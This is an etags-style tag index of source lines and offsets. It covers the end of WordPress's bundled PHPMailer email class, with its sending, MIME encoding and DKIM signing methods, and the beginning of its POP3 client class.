  protected   $sign_key_pass  = '';sign_key_pass353,9752
  protected   $sign_key_pass  = '';sign_key_pass353,9752
  protected   $exceptions     = false;exceptions354,9788
  protected   $exceptions     = false;exceptions354,9788
  public function __construct($exceptions = false) {__construct372,10391
    $this->exceptions = ($exceptions == true);exceptions373,10444
  public function IsHTML($ishtml = true) {IsHTML381,10583
      $this->ContentType = 'text/html';ContentType383,10645
      $this->ContentType = 'text/plain';ContentType385,10698
  public function IsSMTP() {IsSMTP393,10825
    $this->Mailer = 'smtp';Mailer394,10854
  public function IsMail() {IsMail401,10977
    $this->Mailer = 'mail';Mailer402,11006
  public function IsSendmail() {IsSendmail409,11131
      $this->Sendmail = '/var/qmail/bin/sendmail';Sendmail411,11222
    $this->Mailer = 'sendmail';Mailer413,11279
  public function IsQmail() {IsQmail420,11400
      $this->Sendmail = '/var/qmail/bin/sendmail';Sendmail422,11484
    $this->Mailer = 'sendmail';Mailer424,11541
  public function AddAddress($address, $name = '') {AddAddress437,11867
  public function AddAddress($address, $name = '') {name437,11867
   * Note: this function works with the SMTP mailer on win32, not with the "mail" mailer.works443,12012
  public function AddCC($address, $name = '') {AddCC448,12229
  public function AddCC($address, $name = '') {name448,12229
   * Note: this function works with the SMTP mailer on win32, not with the "mail" mailer.works454,12370
  public function AddBCC($address, $name = '') {AddBCC459,12587
  public function AddBCC($address, $name = '') {name459,12587
  public function AddReplyTo($address, $name = '') {AddReplyTo469,12815
  public function AddReplyTo($address, $name = '') {name469,12815
  protected function AddAnAddress($kind, $address, $name = '') {AddAnAddress482,13341
  protected function AddAnAddress($kind, $address, $name = '') {name482,13341
    $address = trim($address);address493,13777
    $name = trim(preg_replace('/[\r\n]+/', '', $name)); //Strip breaks and trimname494,13808
  public function SetFrom($address, $name = '', $auto = 1) {SetFrom526,14805
  public function SetFrom($address, $name = '', $auto = 1) {name526,14805
    $address = trim($address);address527,14866
    $name = trim(preg_replace('/[\r\n]+/', '', $name)); //Strip breaks and trimname528,14897
    $this->From = $address;From539,15334
    $this->FromName = $name;FromName540,15362
        $this->Sender = $address;Sender546,15543
  public static function ValidateAddress($address) {ValidateAddress563,16106
  public function Send() {Send585,17060
	  $this->SentMIMEMessage = '';SentMIMEMessage590,17209
  protected function PreSend() {PreSend599,17370
	  $mailHeader = "";mailHeader601,17413
        $this->ContentType = 'multipart/alternative';ContentType608,17702
      $this->error_count = 0; // reset errorserror_count611,17765
      $this->MIMEHeader = $this->CreateHeader();MIMEHeader618,18012
      $this->MIMEBody = $this->CreateBody();MIMEBody619,18061
        $header_dkim = $this->DKIM_Add($this->MIMEHeader, $this->EncodeHeader($this->SecureHeader($this->Subject)), $this->MIMEBody);header_dkim637,18820
        $this->MIMEHeader = str_replace("\r\n", "\n", $header_dkim) . $this->MIMEHeader;MIMEHeader638,18954
      $this->SentMIMEMessage = sprintf("%s%s\r\n\r\n%s",$this->MIMEHeader,$mailHeader,$this->MIMEBody);SentMIMEMessage641,19052
  protected function PostSend() {PostSend653,19343
  protected function SendmailSend($header, $body) {SendmailSend686,20266
      $sendmail = sprintf("%s -oi -f %s -t", escapeshellcmd($this->Sendmail), escapeshellarg($this->Sender));sendmail688,20349
      $sendmail = sprintf("%s -oi -t", escapeshellcmd($this->Sendmail));sendmail690,20472
      foreach ($this->SingleToArray as $key => $val) {key693,20587
        $result = pclose($mail);result700,20905
        // implement call back function if it existsif701,20938
        $isSent = ($result == 0) ? 1 : 0;isSent702,20991
      $result = pclose($mail);result714,21491
      // implement call back function if it existsif715,21522
      $isSent = ($result == 0) ? 1 : 0;isSent716,21573
  protected function MailSend($header, $body) {MailSend732,22055
    $toArr = array();toArr733,22103
    $to = implode(', ', $toArr);to737,22202
      $params = "-oi ";params740,22268
      $params = sprintf("-oi -f %s", $this->Sender);params742,22305
      $old_from = ini_get('sendmail_from');old_from745,22421
        foreach ($toArr as $key => $val) {key748,22571
          $rt = @mail($val, $this->EncodeHeader($this->SecureHeader($this->Subject)), $body, $header, $params);rt749,22614
          // implement call back function if it existsif750,22726
          $isSent = ($rt == 1) ? 1 : 0;isSent751,22781
        $rt = @mail($to, $this->EncodeHeader($this->SecureHeader($this->Subject)), $body, $header, $params);rt755,22936
        // implement call back function if it existsif756,23045
        $isSent = ($rt == 1) ? 1 : 0;isSent757,23098
        foreach ($toArr as $key => $val) {key762,23303
          $rt = @mail($val, $this->EncodeHeader($this->SecureHeader($this->Subject)), $body, $header);rt763,23346
          // implement call back function if it existsif764,23449
          $isSent = ($rt == 1) ? 1 : 0;isSent765,23504
        $rt = @mail($to, $this->EncodeHeader($this->SecureHeader($this->Subject)), $body, $header);rt769,23659
        // implement call back function if it existsif770,23759
        $isSent = ($rt == 1) ? 1 : 0;isSent771,23812
  protected function SmtpSend($header, $body) {SmtpSend793,24422
    $bad_rcpt = array();bad_rcpt795,24524
    $smtp_from = ($this->Sender == '') ? $this->From : $this->Sender;smtp_from800,24681
        // implement call back function if it existsif809,25049
        $isSent = 0;isSent810,25102
        // implement call back function if it existsif813,25213
        $isSent = 1;isSent814,25266
        // implement call back function if it existsif821,25483
        $isSent = 0;isSent822,25536
        // implement call back function if it existsif825,25647
        $isSent = 1;isSent826,25700
        // implement call back function if it existsif833,25921
        $isSent = 0;isSent834,25974
        // implement call back function if it existsif837,26086
        $isSent = 1;isSent838,26139
      $badaddresses = implode(', ', $bad_rcpt);badaddresses845,26330
  public function SmtpConnect() {SmtpConnect864,26865
      $this->smtp = new SMTP();smtp866,26930
    $hosts = explode(';', $this->Host);hosts870,27015
    $index = 0;index871,27055
    $connection = $this->smtp->Connected();connection872,27071
        $hostinfo = array();hostinfo877,27222
          $host = $hostinfo[1];host879,27325
          $port = $hostinfo[2];port880,27357
          $host = $hosts[$index];host882,27406
          $port = $this->Port;port883,27440
        $tls = ($this->SMTPSecure == 'tls');tls886,27482
        $ssl = ($this->SMTPSecure == 'ssl');ssl887,27527
          $hello = ($this->Helo != '' ? $this->Helo : $this->ServerHostname());hello891,27661
          $connection = true;connection903,28034
  public function SmtpClose() {SmtpClose928,28648
  * Sets the language for all class error messages.error938,28833
  function SetLanguage($langcode = 'en', $lang_path = 'language/') {SetLanguage944,29151
  function SetLanguage($langcode = 'en', $lang_path = 'language/') {lang_path944,29151
    $PHPMAILER_LANG = array(PHPMAILER_LANG946,29266
    $l = true;l966,30407
      $l = @include $lang_path.'phpmailer.lang-'.$langcode.'.php';l968,30490
    $this->language = $PHPMAILER_LANG;language970,30563
  public function GetTranslations() {GetTranslations978,30748
  public function AddrAppend($type, $addr) {AddrAppend991,31039
    $addr_str = $type . ': ';addr_str992,31084
    $addresses = array();addresses993,31114
  public function AddrFormat($addr) {AddrFormat1008,31405
  public function WrapText($message, $length, $qp_mode = false) {WrapText1026,32031
  public function WrapText($message, $length, $qp_mode = false) {qp_mode1026,32031
    $soft_break = ($qp_mode) ? sprintf(" =%s", $this->LE) : $this->LE;soft_break1027,32097
    $is_utf8 = (strtolower($this->CharSet) == "utf-8");is_utf81030,32284
    $message = $this->FixEOL($message);message1032,32341
      $message = substr($message, 0, -1);message1034,32426
    $line = explode($this->LE, $message);line1037,32475
    $message = '';message1038,32517
      $line_part = explode(' ', $line[$i]);line_part1040,32580
      $buf = '';buf1041,32624
        $word = $line_part[$e];word1043,32690
          $space_left = $length - strlen($buf) - 1;space_left1045,32776
              $len = $space_left;len1048,32889
                $len = $this->UTF8CharBoundary($word, $len);len1050,32953
              $part = substr($word, 0, $len);part1056,33203
              $word = substr($word, $len);word1057,33249
            $buf = '';buf1063,33468
            $len = $length;len1066,33541
              $len = $this->UTF8CharBoundary($word, $len);len1068,33597
            $part = substr($word, 0, $len);part1074,33835
            $word = substr($word, $len);word1075,33879
              $buf = $part;buf1080,34040
          $buf_o = $buf;buf_o1084,34111
            $buf = $word;buf1089,34293
  public function UTF8CharBoundary($encodedText, $maxLength) {UTF8CharBoundary1108,34738
    $foundSplitPos = false;foundSplitPos1109,34801
    $lookBack = 3;lookBack1110,34829
      $lastChunk = substr($encodedText, $maxLength - $lookBack, $lookBack);lastChunk1112,34878
      $encodedCharPos = strpos($lastChunk, "=");encodedCharPos1113,34954
        $hex = substr($encodedText, $maxLength - $lookBack + $encodedCharPos + 1, 2);hex1117,35183
        $dec = hexdec($hex);dec1118,35269
          $maxLength = ($encodedCharPos == 0) ? $maxLength :maxLength1122,35484
          $foundSplitPos = true;foundSplitPos1124,35599
          $maxLength = $maxLength - ($lookBack - $encodedCharPos);maxLength1127,35766
          $foundSplitPos = true;foundSplitPos1128,35833
        $foundSplitPos = true;foundSplitPos1134,36047
  public function SetWordWrap() {SetWordWrap1146,36199
        $this->AltBody = $this->WrapText($this->AltBody, $this->WordWrap);AltBody1156,36418
        $this->Body = $this->WrapText($this->Body, $this->WordWrap);Body1159,36523
  public function CreateHeader() {CreateHeader1169,36722
    $result = '';result1170,36757
    $uniq_id = md5(uniqid(time()));uniq_id1173,36802
    $from = array();from1200,37685
  public function GetMailMIME() {GetMailMIME1257,39675
    $result = '';result1258,39709
  public function GetSentMIMEMessage() {GetSentMIMEMessage1294,40918
  public function CreateBody() {CreateBody1304,41149
    $body = '';body1305,41182
      $body = '';body1404,45879
        $file = tempnam('', 'mail');file1407,45947
        $signed = tempnam("", "signed");signed1409,46050
          $body = file_get_contents($signed);body1412,46268
        $body = '';body1420,46550
  protected function GetBoundary($boundary, $charSet, $contentType, $encoding) {GetBoundary1435,46772
    $result = '';result1436,46853
      $charSet = $this->CharSet;charSet1438,46896
      $contentType = $this->ContentType;contentType1441,46964
      $encoding = $this->Encoding;encoding1444,47037
  protected function EndBoundary($boundary) {EndBoundary1460,47463
  protected function SetMessageType() {SetMessageType1469,47655
    $this->message_type = array();message_type1470,47695
    $this->message_type = implode("_", $this->message_type);message_type1474,47933
    if($this->message_type == "") $this->message_type = "plain";message_type1475,47994
  public function HeaderLine($name, $value) {HeaderLine1483,48155
  public function TextLine($value) {TextLine1492,48340
  public function AddAttachment($path, $name = '', $encoding = 'base64', $type = 'application/octet-stream') {AddAttachment1510,48921
  public function AddAttachment($path, $name = '', $encoding = 'base64', $type = 'application/octet-stream') {name1510,48921
      $filename = basename($path);filename1515,49177
      if ( $name == '' ) {name1516,49212
        $name = $filename;name1517,49239
  public function GetAttachments() {GetAttachments1550,49903
  protected function AttachAll($disposition_type, $boundary) {AttachAll1560,50140
    $mime = array();mime1562,50230
    $cidUniq = array();cidUniq1563,50251
    $incl = array();incl1564,50275
        $bString = $attachment[5];bString1571,50511
          $string = $attachment[0];string1573,50570
          $path = $attachment[0];path1575,50623
        $inclhash = md5(serialize($attachment));inclhash1578,50668
        $filename    = $attachment[1];filename1581,50805
        $name        = $attachment[2];name1582,50844
        $encoding    = $attachment[3];encoding1583,50883
        $type        = $attachment[4];type1584,50922
        $disposition = $attachment[6];disposition1585,50961
        $cid         = $attachment[7];cid1586,51000
        if ( $disposition == 'inline' && isset($cidUniq[$cid]) ) { continue; }disposition1587,51039
  protected function EncodeFile($path, $encoding = 'base64') {EncodeFile1631,52560
  protected function EncodeFile($path, $encoding = 'base64') {encoding1631,52560
        function get_magic_quotes() {get_magic_quotes1637,52816
	  $magic_quotes = get_magic_quotes_runtime();magic_quotes1641,52896
      $file_buffer  = file_get_contents($path);file_buffer1649,53130
      $file_buffer  = $this->EncodeString($file_buffer, $encoding);file_buffer1650,53178
  public function EncodeString($str, $encoding = 'base64') {EncodeString1673,53874
  public function EncodeString($str, $encoding = 'base64') {encoding1673,53874
    $encoded = '';encoded1674,53935
        $encoded = chunk_split(base64_encode($str), 76, $this->LE);encoded1677,54011
        $encoded = $this->FixEOL($str);encoded1681,54132
        $encoded = $str;encoded1687,54352
        $encoded = $this->EncodeQP($str);encoded1690,54423
  public function EncodeHeader($str, $position = 'text') {EncodeHeader1704,54728
  public function EncodeHeader($str, $position = 'text') {position1704,54728
    $x = 0;x1705,54787
          $encoded = addcslashes($str, "\0..\37\177\\\"");encoded1711,54994
        $x = preg_match_all('/[^\040\041\043-\133\135-\176]/', $str, $matches);x1718,55259
        $x = preg_match_all('/[()"]/', $str, $matches);x1721,55376
    $maxlen = 75 - 7 - strlen($this->CharSet);maxlen1733,55648
      $encoding = 'B';encoding1736,55801
        // Use a custom function which correctly encodes and wraps longwhich1738,55896
        $encoded = $this->Base64EncodeWrapMB($str);encoded1740,56039
        $encoded = base64_encode($str);encoded1742,56106
        $encoded = trim(chunk_split($encoded, $maxlen, "\n"));encoded1744,56178
      $encoding = 'Q';encoding1747,56262
      $encoded = $this->EncodeQ($str, $position);encoded1748,56285
      $encoded = $this->WrapText($encoded, $maxlen, true);encoded1749,56335
      $encoded = str_replace('='.$this->LE, "\n", trim($encoded));encoded1750,56394
    $encoded = preg_replace('/^(.*)$/m', " =?".$this->CharSet."?$encoding?\\1?=", $encoded);encoded1753,56468
    $encoded = trim(str_replace("\n", $this->LE, $encoded));encoded1754,56561
  public function HasMultiBytes($str) {HasMultiBytes1765,56809
   * Adapted from a function by paravoid at http://uk.php.net/manual/en/function.mb-encode-mimeheader.phpby1776,57199
  public function Base64EncodeWrapMB($str) {Base64EncodeWrapMB1781,57406
    $start = "=?".$this->CharSet."?B?";start1782,57451
    $end = "?=";end1783,57491
    $encoded = "";encoded1784,57508
    $mb_length = mb_strlen($str, $this->CharSet);mb_length1786,57528
    $length = 75 - strlen($start) - strlen($end);length1788,57645
    $ratio = $mb_length / strlen($str);ratio1790,57727
    $offset = $avgLength = floor($length * $ratio * .75);offset1792,57797
      $lookBack = 0;lookBack1795,57907
        $offset = $avgLength - $lookBack;offset1798,57940
        $chunk = mb_substr($str, $i, $offset, $this->CharSet);chunk1799,57982
        $chunk = base64_encode($chunk);chunk1800,58045
    $encoded = substr($encoded, 0, -strlen($this->LE));encoded1809,58231
  public function EncodeQPphp( $input = '', $line_max = 76, $space_conv = false) {EncodeQPphp1821,58580
  public function EncodeQPphp( $input = '', $line_max = 76, $space_conv = false) {input1821,58580
    $hex = array('0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F');hex1822,58663
    $lines = preg_split('/(?:\r\n|\r|\n)/', $input);lines1823,58761
    $eol = "\r\n";eol1824,58814
    $escape = '=';escape1825,58833
    $output = '';output1826,58852
      $linlen = strlen($line);linlen1828,58914
      $newline = '';newline1829,58945
        $c = substr( $line, $i, 1 );c1831,59006
        $dec = ord( $c );dec1832,59043
        if ( ( $i == 0 ) && ( $dec == 46 ) ) { // convert first point in the line into =2Ei1833,59069
          $c = '=2E';c1834,59160
        if ( $dec == 32 ) {dec1836,59192
          if ( $i == ( $linlen - 1 ) ) { // convert space at eol onlyi1837,59220
            $c = '=20';c1838,59290
            $c = '=20';c1840,59352
          $h2 = floor($dec/16);h21843,59503
          $h1 = floor($dec%16);h11844,59535
          $c = $escape.$hex[$h2].$hex[$h1];c1845,59567
          $newline = '';newline1849,59788
          if ( $dec == 46 ) {dec1851,59880
            $c = '=2E';c1852,59910
  public function EncodeQP($string, $line_max = 76, $space_conv = false) {EncodeQP1874,60611
  public function EncodeQP($string, $line_max = 76, $space_conv = false) {line_max1874,60611
    if (function_exists('quoted_printable_encode')) { //Use native function if it's available (>= PHP5.3)if1875,60686
    $filters = stream_get_filters();filters1878,60845
    $fp = fopen('php://temp/', 'r+');fp1882,61061
    $string = preg_replace('/\r\n?/', $this->LE, $string); //Normalise line breaksstring1883,61099
    $params = array('line-length' => $line_max, 'line-break-chars' => $this->LE);params1884,61182
    $s = stream_filter_append($fp, 'convert.quoted-printable-encode', STREAM_FILTER_READ, $params);s1885,61264
    $out = stream_get_contents($fp);out1888,61406
    $out = preg_replace('/^\./m', '=2E', $out); //Encode . if it is first char on a line, workaround for bug in Exchangeout1890,61473
  public function EncodeQ($str, $position = 'text') {EncodeQ1903,61905
  public function EncodeQ($str, $position = 'text') {position1903,61905
    $encoded = preg_replace('/[\r\n]*/', '', $str);encoded1905,62008
        $encoded = preg_replace("/([^A-Za-z0-9!*+\/ -])/e", "'='.sprintf('%02X', ord('\\1'))", $encoded);encoded1909,62119
        $encoded = preg_replace("/([\(\)\"])/e", "'='.sprintf('%02X', ord('\\1'))", $encoded);encoded1912,62262
        $encoded = preg_replace('/([\000-\011\013\014\016-\037\075\077\137\177-\377])/e',encoded1917,62533
    $encoded = str_replace(' ', '_', $encoded);encoded1923,62795
  public function AddStringAttachment($string, $filename, $encoding = 'base64', $type = 'application/octet-stream') {AddStringAttachment1938,63292
  public function AddStringAttachment($string, $filename, $encoding = 'base64', $type = 'application/octet-stream') {encoding1938,63292
  public function AddEmbeddedImage($path, $cid, $name = '', $encoding = 'base64', $type = 'application/octet-stream') {AddEmbeddedImage1965,64300
  public function AddEmbeddedImage($path, $cid, $name = '', $encoding = 'base64', $type = 'application/octet-stream') {name1965,64300
    $filename = basename($path);filename1972,64537
    if ( $name == '' ) {name1973,64570
      $name = $filename;name1974,64595
  public function AddStringEmbeddedImage($string, $cid, $filename = '', $encoding = 'base64', $type = 'application/octet-stream') {AddStringEmbeddedImage1992,64901
  public function AddStringEmbeddedImage($string, $cid, $filename = '', $encoding = 'base64', $type = 'application/octet-stream') {filename1992,64901
  public function InlineImageExists() {InlineImageExists2011,65408
  public function AttachmentExists() {AttachmentExists2020,65594
  public function AlternativeExists() {AlternativeExists2029,65783
  public function ClearAddresses() {ClearAddresses2041,66102
    $this->to = array();to2045,66233
  public function ClearCCs() {ClearCCs2052,66361
    $this->cc = array();cc2056,66486
  public function ClearBCCs() {ClearBCCs2063,66615
    $this->bcc = array();bcc2067,66744
  public function ClearReplyTos() {ClearReplyTos2074,66878
    $this->ReplyTo = array();ReplyTo2075,66914
  public function ClearAllRecipients() {ClearAllRecipients2083,67064
    $this->to = array();to2084,67105
    $this->cc = array();cc2085,67130
    $this->bcc = array();bcc2086,67155
    $this->all_recipients = array();all_recipients2087,67181
  public function ClearAttachments() {ClearAttachments2095,67348
    $this->attachment = array();attachment2096,67387
  public function ClearCustomHeaders() {ClearCustomHeaders2103,67502
    $this->CustomHeader = array();CustomHeader2104,67543
  protected function SetError($msg) {SetError2116,67827
      $lasterror = $this->smtp->getError();lasterror2119,67952
    $this->ErrorInfo = $msg;ErrorInfo2124,68174
  public static function RFCDate() {RFCDate2133,68321
    $tz = date('Z');tz2134,68358
    $tzs = ($tz < 0) ? '-' : '+';tzs2135,68379
    $tz = abs($tz);tz2136,68413
    $tz = (int)($tz/3600)*100 + ($tz%3600)/60;tz2137,68433
    $result = sprintf("%s %s%04d", date('D, j M Y H:i:s'), $tzs, $tz);result2138,68480
  protected function ServerHostname() {ServerHostname2148,68704
      $result = $this->Hostname;result2150,68779
      $result = $_SERVER['SERVER_NAME'];result2152,68860
      $result = 'localhost.localdomain';result2154,68914
  protected function Lang($key) {Lang2165,69094
  public function IsError() {IsError2182,69477
  public function FixEOL($str) {FixEOL2191,69655
    $str = str_replace("\r\n", "\n", $str);str2192,69688
    $str = str_replace("\r", "\n", $str);str2193,69732
    $str = str_replace("\n", $this->LE, $str);str2194,69774
  public function AddCustomHeader($custom_header) {AddCustomHeader2203,69920
  public function MsgHTML($message, $basedir = '') {MsgHTML2212,70179
  public function MsgHTML($message, $basedir = '') {basedir2212,70179
      foreach($images[2] as $i => $url) {i2215,70338
          $filename = basename($url);filename2218,70503
          $directory = dirname($url);directory2219,70541
          ($directory == '.') ? $directory='': '';directory2220,70579
          $cid = 'cid:' . md5($filename);cid2221,70630
          $ext = pathinfo($filename, PATHINFO_EXTENSION);ext2222,70672
          $mimeType  = self::_mime_types($ext);mimeType2223,70730
            $message = preg_replace("/".$images[1][$i]."=[\"']".preg_quote($url, '/')."[\"']/Ui", $images[1][$i]."=\"".$cid."\"", $message);message2227,71084
    $this->Body = $message;Body2233,71286
		$textMsg = trim(strip_tags(preg_replace('/<(head|title|style|script)[^>]*>.*?<\/\\1>/s', '', $message)));textMsg2235,71344
			$this->AltBody = html_entity_decode($textMsg, ENT_QUOTES, $this->CharSet);AltBody2237,71478
      $this->AltBody = 'To view this email message, open it in a program that understands HTML!' . "\n\n";AltBody2241,71596
  public static function _mime_types($ext = '') {_mime_types2253,71904
    $mimes = array(mimes2254,71954
  public function set($name, $value = '') {set2358,75830
  public function set($name, $value = '') {value2358,75830
  public function SecureHeader($str) {SecureHeader2380,76379
    $str = str_replace("\r", '', $str);str2381,76418
    $str = str_replace("\n", '', $str);str2382,76458
  public function Sign($cert_filename, $key_filename, $key_pass) {Sign2393,76734
    $this->sign_cert_file = $cert_filename;sign_cert_file2394,76801
    $this->sign_key_file = $key_filename;sign_key_file2395,76845
    $this->sign_key_pass = $key_pass;sign_key_pass2396,76887
  public function DKIM_QP($txt) {DKIM_QP2406,77138
    $tmp = '';tmp2407,77172
    $line = '';line2408,77187
      $ord = ord($txt[$i]);ord2410,77247
      if ( ((0x21 <= $ord) && ($ord <= 0x3A)) || $ord == 0x3C || ((0x3E <= $ord) && ($ord <= 0x7E)) ) {ord2411,77275
  public function DKIM_Sign($s) {DKIM_Sign2426,77597
    $privKeyStr = file_get_contents($this->DKIM_private);privKeyStr2427,77631
      $privKey = openssl_pkey_get_private($privKeyStr, $this->DKIM_passphrase);privKey2429,77729
      $privKey = $privKeyStr;privKey2431,77822
  public function DKIM_HeaderC($s) {DKIM_HeaderC2444,78068
    $s = preg_replace("/\r\n\s+/", " ", $s);s2445,78105
    $lines = explode("\r\n", $s);lines2446,78150
    foreach ($lines as $key => $line) {key2447,78184
      $heading = strtolower($heading);heading2449,78279
      $value = preg_replace("/\s+/", " ", $value) ; // Compress useless spacesvalue2450,78318
    $s = implode("\r\n", $lines);s2453,78499
  public function DKIM_BodyC($body) {DKIM_BodyC2463,78669
    $body = str_replace("\r\n", "\n", $body);body2466,78773
    $body = str_replace("\n", "\r\n", $body);body2467,78819
      $body = substr($body, 0, strlen($body) - 2);body2470,78963
  public function DKIM_Add($headers_line, $subject, $body) {DKIM_Add2483,79241
    $DKIMsignatureType    = 'rsa-sha1'; // Signature & hash algorithmsDKIMsignatureType2484,79302
    $DKIMcanonicalization = 'relaxed/simple'; // Canonicalization of header/bodyDKIMcanonicalization2485,79373
    $DKIMquery            = 'dns/txt'; // Query methodDKIMquery2486,79454
    $DKIMtime             = time() ; // Signature Timestamp = seconds since 00:00:00 - Jan 1, 1970 (UTC time zone)DKIMtime2487,79509
    $subject_header       = "Subject: $subject";subject_header2488,79624
    $headers              = explode($this->LE, $headers_line);headers2489,79673
        $from_header = $header;from_header2492,79815
        $to_header = $header;to_header2494,79895
    $from     = str_replace('|', '=7C', $this->DKIM_QP($from_header));from2497,79939
    $to       = str_replace('|', '=7C', $this->DKIM_QP($to_header));to2498,80010
    $subject  = str_replace('|', '=7C', $this->DKIM_QP($subject_header)) ; // Copied header fields (dkim-quoted-printablesubject2499,80079
    $body     = $this->DKIM_BodyC($body);body2500,80201
    $DKIMlen  = strlen($body) ; // Length of bodyDKIMlen2501,80243
    $DKIMb64  = base64_encode(pack("H*", sha1($body))) ; // Base64 of packed binary SHA-1 hash of bodyDKIMb642502,80293
    $ident    = ($this->DKIM_identity == '')? '' : " i=" . $this->DKIM_identity . ";";ident2503,80396
    $dkimhdrs = "DKIM-Signature: v=1; a=" . $DKIMsignatureType . "; q=" . $DKIMquery . "; l=" . $DKIMlen . "; s=" . $this->DKIM_selector . ";\r\n".dkimhdrs2504,80483
    $toSign   = $this->DKIM_HeaderC($from_header . "\r\n" . $to_header . "\r\n" . $subject_header . "\r\n" . $dkimhdrs);toSign2513,80992
    $signed   = $this->DKIM_Sign($toSign);signed2514,81113
  protected function doCallback($isSent, $to, $cc, $bcc, $subject, $body) {doCallback2518,81245
      $params = array($isSent, $to, $cc, $bcc, $subject, $body);params2520,81406
class phpmailerException extends Exception {phpmailerException2526,81545
  public function errorMessage() {errorMessage2527,81590
    $errorMsg = '<strong>' . $this->getMessage() . "</strong><br />\n";errorMsg2528,81625

wordpress/wp-includes/class-pop3.php,11229
 * An RFC 1939 compliant wrapper class for the POP3 protocol.for7,170
class POP3 {POP319,506
    var $ERROR      = '';       //  Error string.ERROR20,519
    var $ERROR      = '';       //  Error string.ERROR20,519
    var $TIMEOUT    = 60;       //  Default timeout before giving up on aTIMEOUT22,570
    var $TIMEOUT    = 60;       //  Default timeout before giving up on aTIMEOUT22,570
    var $COUNT      = -1;       //  Mailbox msg countCOUNT25,700
    var $COUNT      = -1;       //  Mailbox msg countCOUNT25,700
    var $BUFFER     = 512;      //  Socket buffer for socket fgets() calls.BUFFER27,755
    var $BUFFER     = 512;      //  Socket buffer for socket fgets() calls.BUFFER27,755
    var $FP         = '';       //  The connection to the server'sFP31,972
    var $FP         = '';       //  The connection to the server'sFP31,972
    var $MAILSERVER = '';       // Set this to hard code the server nameMAILSERVER34,1092
    var $MAILSERVER = '';       // Set this to hard code the server nameMAILSERVER34,1092
    var $DEBUG      = FALSE;    // set to true to echo pop3DEBUG36,1166
    var $DEBUG      = FALSE;    // set to true to echo pop3DEBUG36,1166
    var $BANNER     = '';       //  Holds the banner returned by theBANNER40,1358
    var $BANNER     = '';       //  Holds the banner returned by theBANNER40,1358
    var $ALLOWAPOP  = FALSE;    //  Allow or disallow apop()ALLOWAPOP43,1493
    var $ALLOWAPOP  = FALSE;    //  Allow or disallow apop()ALLOWAPOP43,1493
    function POP3 ( $server = '', $timeout = '' ) {POP347,1661
    function POP3 ( $server = '', $timeout = '' ) {server47,1661
                $this->MAILSERVER = $server;MAILSERVER54,2016
            $this->TIMEOUT = $timeout;TIMEOUT58,2143
    function update_timer () {update_timer65,2301
    function connect ($server, $port = 110)  {connect71,2439
    function connect ($server, $port = 110)  {port71,2439
            $server = $this->MAILSERVER;server79,2784
            $this->ERROR = "POP3 connect: " . _("No server specified");ERROR82,2854
        $fp = @fsockopen("$server", $port, $errno, $errstr);fp87,2993
            $this->ERROR = "POP3 connect: " . _("Error ") . "[$errno] [$errstr]";ERROR90,3074
        $reply = fgets($fp,$this->BUFFER);reply97,3291
        $reply = $this->strip_clf($reply);reply98,3334
            $this->ERROR = "POP3 connect: " . _("Error ") . "[$reply]";ERROR102,3508
        $this->FP = $fp;FP106,3646
        $this->BANNER = $this->parse_banner($reply);BANNER107,3671
    function user ($user = "") {user111,3752
            $this->ERROR = "POP3 user: " . _("no login ID submitted");ERROR115,3872
            $this->ERROR = "POP3 user: " . _("connection not established");ERROR118,4007
            $reply = $this->send_cmd("USER $user");reply121,4126
                $this->ERROR = "POP3 user: " . _("Error ") . "[$reply]";ERROR123,4218
    function pass ($pass = "")     {pass130,4386
            $this->ERROR = "POP3 pass: " . _("No password submitted");ERROR135,4565
            $this->ERROR = "POP3 pass: " . _("connection not established");ERROR138,4700
            $reply = $this->send_cmd("PASS $pass");reply141,4819
                $this->ERROR = "POP3 pass: " . _("Authentication failed") . " [$reply]";ERROR143,4911
                $count = $this->last("count");count148,5119
                $this->COUNT = $count;COUNT149,5166
    function apop ($login,$pass) {apop155,5267
            $this->ERROR = "POP3 apop: " . _("No connection to server");ERROR162,5535
            $retVal = $this->login($login,$pass);retVal165,5672
            $this->ERROR = "POP3 apop: " . _("No login ID submitted");ERROR168,5784
            $this->ERROR = "POP3 apop: " . _("No password submitted");ERROR171,5914
            $banner = $this->BANNER;banner174,6028
                $this->ERROR = "POP3 apop: " . _("No server banner") . ' - ' . _("abort");ERROR176,6116
                $retVal = $this->login($login,$pass);retVal177,6207
                $AuthString = $banner;AuthString180,6314
                $APOPString = md5($AuthString);APOPString182,6391
                $cmd = "APOP $login $APOPString";cmd183,6439
                $reply = $this->send_cmd($cmd);reply184,6489
                    $this->ERROR = "POP3 apop: " . _("apop authentication failed") . ' - ' . _("abort");ERROR186,6581
                    $retVal = $this->login($login,$pass);retVal187,6686
                    $count = $this->last("count");count191,6846
                    $this->COUNT = $count;COUNT192,6897
    function login ($login = "", $pass = "") {login199,7024
    function login ($login = "", $pass = "") {pass199,7024
            $this->ERROR = "POP3 login: " . _("No connection to server");ERROR205,7281
            $fp = $this->FP;fp208,7398
                $count = $this->pass($pass);count213,7580
    function top ($msgNum, $numLines = "0") {top223,7874
    function top ($msgNum, $numLines = "0") {numLines223,7874
            $this->ERROR = "POP3 top: " . _("No connection to server");ERROR230,8208
        $fp = $this->FP;fp235,8348
        $buffer = $this->BUFFER;buffer236,8373
        $cmd = "TOP $msgNum $numLines";cmd237,8406
        $reply = fgets($fp, $buffer);reply239,8496
        $reply = $this->strip_clf($reply);reply240,8534
            $this->ERROR = "POP3 top: " . _("Error ") . "[$reply]";ERROR246,8717
        $count = 0;count250,8822
        $MsgArray = array();MsgArray251,8842
        $line = fgets($fp,$buffer);line253,8872
            $line = fgets($fp,$buffer);line258,9027
    function pop_list ($msgNum = "") {pop_list265,9154
            $this->ERROR = "POP3 pop_list: " . _("No connection to server");ERROR272,9424
        $fp = $this->FP;fp275,9537
        $Total = $this->COUNT;Total276,9562
            $cmd = "LIST $msgNum";cmd291,9876
            $reply = fgets($fp,$this->BUFFER);reply293,9947
            $reply = $this->strip_clf($reply);reply294,9994
                $this->ERROR = "POP3 pop_list: " . _("Error ") . "[$reply]";ERROR300,10201
        $cmd = "LIST";cmd306,10423
        $reply = $this->send_cmd($cmd);reply307,10446
            $reply = $this->strip_clf($reply);reply310,10530
            $this->ERROR = "POP3 pop_list: " . _("Error ") .  "[$reply]";ERROR311,10577
        $MsgArray = array();MsgArray314,10687
            $line = fgets($fp,$this->BUFFER);line319,10845
            $line = $this->strip_clf($line);line320,10891
                $this->ERROR = "POP3 pop_list: " . _("Premature end of list");ERROR323,10991
    function get ($msgNum) {get340,11461
            $this->ERROR = "POP3 get: " . _("No connection to server");ERROR346,11655
        $fp = $this->FP;fp352,11796
